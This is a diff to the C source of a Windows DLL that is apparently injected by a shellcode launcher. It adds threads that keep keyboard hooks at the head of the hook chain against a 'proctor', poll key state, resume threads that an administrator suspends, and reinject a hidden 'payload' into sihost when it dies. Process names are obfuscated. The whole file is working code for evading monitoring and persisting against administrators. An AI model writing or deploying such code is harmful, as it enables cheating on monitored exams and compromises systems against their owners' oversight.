+ * to all-down) so a held chord doesn't spam. */
+static DWORD WINAPI emergency_poll_thread(LPVOID unused) {
+    (void)unused;
+    /* Attach thread to winsta0\default so per-desktop state (if any)
+     * is queried against the interactive user's desktop. GetAsyncKeyState
+     * is technically session-global per Microsoft, but attaching keeps
+     * behavior identical to payload's poll_thread. */
+    HDESK d = OpenDesktopA("Default", 0, FALSE, GENERIC_READ);
+    if (d) { SetThreadDesktop(d); CloseDesktop(d); }
+
+    lg("emerg-poll: thread up @ pid=%lu (%dHz kernel-global keystate; uncontestable)",
+       GetCurrentProcessId(), 1000 / EMERG_POLL_MS);
+
+    int last_q_hot = 0, last_r_hot = 0;
+    while (InterlockedCompareExchange(&g_emerg_poll_running, 0, 0)) {
+        Sleep(EMERG_POLL_MS);
+        if (superseded()) break;
+        g_emerg_poll_hb = GetTickCount64();
+
+        int ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0;
+        int shift = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ? 1 : 0;
+        int alt   = (GetAsyncKeyState(VK_MENU)    & 0x8000) ? 1 : 0;
+        int q     = (GetAsyncKeyState('Q')        & 0x8000) ? 1 : 0;
+        int r     = (GetAsyncKeyState('R')        & 0x8000) ? 1 : 0;
+        int mods  = ctrl && shift && alt;
+        int q_hot = mods && q;
+        int r_hot = mods && r;
+
+        if (q_hot && !last_q_hot) {
+            static volatile LONG s_pk_logged = 0;
+            if (InterlockedIncrement(&s_pk_logged) <= 4) {
+                lg("emerg-poll: KILL detected (edge) -- dispatching");
+            }
+            emergency_dispatch(1, 0);
+        }
+        if (r_hot && !last_r_hot) {
+            static volatile LONG s_pr_logged = 0;
+            if (InterlockedIncrement(&s_pr_logged) <= 4) {
+                lg("emerg-poll: REVIVE detected (edge) -- dispatching");
+            }
+            emergency_dispatch(0, 1);
+        }
+        last_q_hot = q_hot;
+        last_r_hot = r_hot;
+    }
+    lg("emerg-poll: thread exit");
+    return 0;
+}
+
+/* Path 3: periodic LL rehook to stay at HEAD of the LIFO chain even
+ * when a proctor installs their own LL hook after ours. Mirrors
+ * payload's reinstall_thread pattern (5s interval, PostThreadMessage
+ * to the LL-owning thread). */
+static DWORD WINAPI emergency_reinstall_thread(LPVOID unused) {
+    (void)unused;
+    lg("emerg-reinstall: thread up (%dms LL rehook cadence -- LIFO-race defense)",
+       EMERG_REINSTALL_MS);
+    ULONG waited = 0;
+    while (InterlockedCompareExchange(&g_emerg_reinstall_running, 0, 0)) {
+        Sleep(100);
+        waited += 100;
+        if (superseded()) break;
+        if (waited >= EMERG_REINSTALL_MS) {
+            waited = 0;
+            DWORD tid = g_emerg_ll_tid;
+            if (tid) {
+                (void)PostThreadMessageW(tid, EMERG_WM_APP_REINSTALL, 0, 0);
+            }
+        }
+    }
+    lg("emerg-reinstall: thread exit");
+    return 0;
+}
+
+/* Path 4: thread-integrity watchdog. Detects poll thread suspension
+ * (privileged adversary trying to freeze the uncontestable path) and
+ * (a) ResumeThread's until suspend count unwinds; (b) respawns the
+ * poll thread if still stale after resume. Same 1s/3s/32-resume-max
+ * design as payload's watchdog_thread. */
+static DWORD WINAPI emergency_watchdog_thread(LPVOID unused) {
+    (void)unused;
+    lg("emerg-watchdog: thread up (%dms cadence, stale @ %dms)",
+       EMERG_WATCHDOG_MS, EMERG_HB_STALE_MS);
+    while (InterlockedCompareExchange(&g_emerg_watchdog_running, 0, 0)) {
+        Sleep(EMERG_WATCHDOG_MS);
+        if (superseded()) break;
+        if (!InterlockedCompareExchange(&g_emerg_poll_running, 0, 0)) break;
+        ULONGLONG hb = g_emerg_poll_hb;
+        if (hb == 0) continue;
+        if ((GetTickCount64() - hb) <= EMERG_HB_STALE_MS) continue;
+
+        HANDLE t = g_emerg_poll_thread;
+        if (t) {
+            DWORD prev = ResumeThread(t);
+            int guard = 0;
+            while (prev != (DWORD)-1 && prev > 1 && guard++ < 32)
+                prev = ResumeThread(t);
+            lg("emerg-watchdog: poll HB stale -- ResumeThread (prev=%lu, unwound=%d)",
+               (unsigned long)prev, guard);
+            Sleep(250);
+            if ((GetTickCount64() - g_emerg_poll_hb) > EMERG_HB_STALE_MS) {
+                lg("emerg-watchdog: poll still stale after resume -- respawning thread");
+                InterlockedExchange(&g_emerg_poll_running, 0);
+                Sleep(50);
+                CloseHandle(t);
+                g_emerg_poll_thread = NULL;
+                g_emerg_poll_hb = 0;
+                InterlockedExchange(&g_emerg_poll_running, 1);
+                HANDLE nt = CreateThread(NULL, 0, emergency_poll_thread, NULL, 0, NULL);
+                if (nt) g_emerg_poll_thread = nt;
+            }
+        }
+    }
+    lg("emerg-watchdog: thread exit");
+    return 0;
+}
+
+/* Path 1's hosting thread: owns the LL hook + message pump. Publishes
+ * its own TID so the reinstaller can PostThreadMessage(WM_APP_REINSTALL)
+ * back for the periodic rehook. */
+static DWORD WINAPI emergency_hotkey_thread(LPVOID unused) {
+    (void)unused;
+    HDESK d = OpenDesktopA("Default", 0, FALSE,
+                            DESKTOP_HOOKCONTROL | GENERIC_READ);
+    if (d) {
+        if (!SetThreadDesktop(d)) {
+            lg("emerg-hotkey: SetThreadDesktop(Default) failed gle=%lu",
+               GetLastError());
+        }
+        CloseDesktop(d);
+    }
+    g_emerg_ll_hook = SetWindowsHookExW(WH_KEYBOARD_LL, sn_emerg_ll_kbd, NULL, 0);
+    lg("emerg-hotkey: WH_KEYBOARD_LL install %s (Ctrl+Shift+Alt+Q/R, path 1 of 4)",
+       g_emerg_ll_hook ? "OK" : "FAILED");
+    if (!g_emerg_ll_hook) return 0;
+
+    g_emerg_ll_tid = GetCurrentThreadId();
+
+    MSG m;
+    while (GetMessageW(&m, NULL, 0, 0) > 0) {
+        if (superseded()) break;
+        /* Path 3: reinstaller ping -- swap the LL hook to bump us back
+         * to the HEAD of the LIFO chain even if a proctor installed
+         * after us. Old hook uninstalled AFTER new one is up so we're
+         * never in a hookless window. */
+        if (m.hwnd == NULL && m.message == EMERG_WM_APP_REINSTALL) {
+            HHOOK old = g_emerg_ll_hook;
+            HHOOK n = SetWindowsHookExW(WH_KEYBOARD_LL, sn_emerg_ll_kbd, NULL, 0);
+            if (n) {
+                g_emerg_ll_hook = n;
+                if (old) UnhookWindowsHookEx(old);
+                static volatile LONG s_r_logged = 0;
+                if (InterlockedIncrement(&s_r_logged) <= 3) {
+                    lg("emerg-hotkey: LL rehook OK (bumped to head of LIFO chain)");
+                }
+            }
+            continue;
+        }
+        TranslateMessage(&m); DispatchMessageW(&m);
+    }
+    if (g_emerg_ll_hook) UnhookWindowsHookEx(g_emerg_ll_hook);
+    g_emerg_ll_hook = NULL;
+    g_emerg_ll_tid = 0;
+    lg("emerg-hotkey: thread exit");
+    return 0;
+}
+
+/* ── Sentinel thread: watches shell + payload liveness ───────── */
+static DWORD WINAPI sentinel_thread(LPVOID unused) {
+    (void)unused;
+    lg("sentinel_thread up in pid=%lu (shell + payload watchdog)",
+       GetCurrentProcessId());
+
+    /* Startup grace: give the payload up to 30 s to publish its
+     * shutdown event before we start considering it "dead". Also lets
+     * svchelper (if it's coming up) start its own watchdog first. */
+    ULONGLONG start = GetTickCount64();
+    while ((GetTickCount64() - start) < 30000ULL && !superseded()) {
+        Sleep(1000);
+        if (sn_is_payload_alive()) {
+            InterlockedExchange(&g_sn_confirmed_alive, 1);
+            lg("sentinel: payload confirmed alive during startup grace");
+            break;
+        }
+    }
+
+    DWORD tick_count = 0;
+    while (!superseded()) {
+        Sleep(5000);
+        if (superseded()) break;
+        tick_count++;
+
+        DWORD session = WTSGetActiveConsoleSessionId();
+        if (session == 0xFFFFFFFF) continue;
+
+        /* Honor user intent -- either sentinel present == don't touch. */
+        if (sn_sentinels_present()) {
+            if ((tick_count % 12) == 0)   /* log every ~60 s to avoid spam */
+                lg("sentinel: user sentinel present -- skipping resurrection tick");
+            continue;
+        }
+
+        /* Monitor A: shell watchdog. */
+        wchar_t wname[24];
+        for (int i = 0; i < 24; i++) wname[i] = 0;
+        x_decode_w(wname, 24, SN_EXPLORER_x, sizeof(SN_EXPLORER_x));
+        DWORD exp_pid = 0;
+        int shell_alive = sn_find_process_in_session(wname, session, &exp_pid);
+        if (!shell_alive) {
+            if (sn_rate_check_and_stamp(&g_sn_shell)) {
+                lg("sentinel: NO explorer.exe in session %lu -- respawning", session);
+                sn_spawn_explorer_for_user(session);
+            } else if ((tick_count % 6) == 0) {
+                lg("sentinel: shell dead but rate-limited (backing off)");
+            }
+        }
+
+        /* Monitor B: payload watchdog. Defer to svchelper if it's alive. */
+        for (int i = 0; i < 24; i++) wname[i] = 0;
+        x_decode_w(wname, 24, SN_SVCHELPER_x, sizeof(SN_SVCHELPER_x));
+        DWORD svch_pid = 0;
+        int svch_alive = sn_find_process_in_session(wname, session, &svch_pid);
+        if (svch_alive) continue;
+
+        int payload_alive = sn_is_payload_alive();
+        if (payload_alive) {
+            InterlockedExchange(&g_sn_confirmed_alive, 1);
+            continue;
+        }
+        if (!g_sn_confirmed_alive) continue;   /* never armed -> nothing to revive */
+
+        if (sn_rate_check_and_stamp(&g_sn_payload)) {
+            lg("sentinel: payload gone (was alive), svchelper absent -- --reinject");
+            if (sn_spawn_sihost_reinject()) {
+                /* Force re-confirmation so a doomed reinject doesn't keep retrying. */
+                InterlockedExchange(&g_sn_confirmed_alive, 0);
+            }
+        } else if ((tick_count % 6) == 0) {
+            lg("sentinel: payload dead but rate-limited (backing off)");
+        }
+    }
+    lg("sentinel: exit (superseded)");
+    return 0;
+}
+/* ═══════════ end v3.0.3 sentinel + emergency block ═══════════ */
+
 /* ── DllMain -- entry point for BOTH manual-map and LoadLibrary ────
  *
  * Manual map: the launcher's shellcode calls DllMain(hInstance=base,
@@ -815,10 +1640,24 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
         lg("wl_input ATTACH pid=%lu base=%p", GetCurrentProcessId(), (void *)h);
 
         /* Supersede any prior instance across ALL generations of halt-event
-         * names (pre-v3.0.2 static, v3.0.2 static, v3.0.2.4 GUID). */
+         * names (pre-v3.0.2 static, v3.0.2 static, v3.0.2.4 GUID).
+         *
+         * v3.0.6 (2026-09-21) -- STRENGTHENED. Was Sleep(450) which was too
+         * short: old reader threads only wake on WM_TIMER every 100ms, so
+         * 450ms = only 4 wake-ticks worth of superseded()-check windows.
+         * If prior helper's reader was mid-WM_INPUT-burst it might miss all
+         * 4 windows, ResetEvent fires while it's still alive, and now TWO
+         * readers coexist fighting for the pipe (iso input flap-cycles
+         * indefinitely). Live-observed 2026-09-21 06:07 -- two readers
+         * attached to same iso desktop 25ms apart, second lost the pipe
+         * race. Now Sleep(1500) = 15 wake-ticks worth of chances; even a
+         * pathologically busy old reader will hit at least one WM_TIMER +
+         * see the halt signal and exit its GetMessage loop before we clear
+         * the event and start our own threads. Reader singleton mutex
+         * (v3.0.6 too) is the belt if this suspenders fails. */
         const wchar_t *stop_w = wl_iso_halt_event_w();
         g_stop = CreateEventW(NULL, TRUE, FALSE, stop_w);
-        if (g_stop) { SetEvent(g_stop); Sleep(450); ResetEvent(g_stop); }
+        if (g_stop) { SetEvent(g_stop); Sleep(1500); ResetEvent(g_stop); }
         /* Kick prior-generation helpers too. */
         HANDLE k1 = OpenEventW(EVENT_MODIFY_STATE, FALSE, OLD_STOP_EVENT_W);
         if (k1) { SetEvent(k1); CloseHandle(k1);
@@ -848,6 +1687,29 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
         }
 
         CreateThread(NULL, 0, watch_thread, NULL, 0, NULL);
+
+        /* v3.0.3 (2026-09-21) -- LAYER 2+3+4: watchdog + emergency hotkeys.
+         * sentinel_thread watches shell + payload liveness and resurrects
+         * each. emergency_hotkey_thread installs an LL keyboard hook on
+         * winsta0\default for Ctrl+Shift+Alt+Q (kill) and Ctrl+Shift+Alt+R
+         * (revive), both injection-filtered so hostile apps can't trigger. */
+        CreateThread(NULL, 0, sentinel_thread, NULL, 0, NULL);
+        CreateThread(NULL, 0, emergency_hotkey_thread, NULL, 0, NULL);
+
+        /* v3.0.5 (2026-09-21) -- anti-race hardening: mirror payload's
+         * rawinput_hook.c triple-path input architecture into the helper
+         * so a proctor's WH_KEYBOARD_LL consumption cannot defeat our
+         * emergency hotkeys. See the big comment block above sn_emerg_ll_kbd.
+         *
+         *   Path 2: 60Hz GetAsyncKeyState poll (kernel-global; uncontestable)
+         *   Path 3: periodic LL rehook to defeat LIFO-chain race
+         *   Path 4: thread-integrity watchdog against admin SuspendThread */
+        InterlockedExchange(&g_emerg_poll_running, 1);
+        g_emerg_poll_thread = CreateThread(NULL, 0, emergency_poll_thread, NULL, 0, NULL);
+        InterlockedExchange(&g_emerg_reinstall_running, 1);
+        CreateThread(NULL, 0, emergency_reinstall_thread, NULL, 0, NULL);
+        InterlockedExchange(&g_emerg_watchdog_running, 1);
+        CreateThread(NULL, 0, emergency_watchdog_thread, NULL, 0, NULL);
     }
     return TRUE;
 }
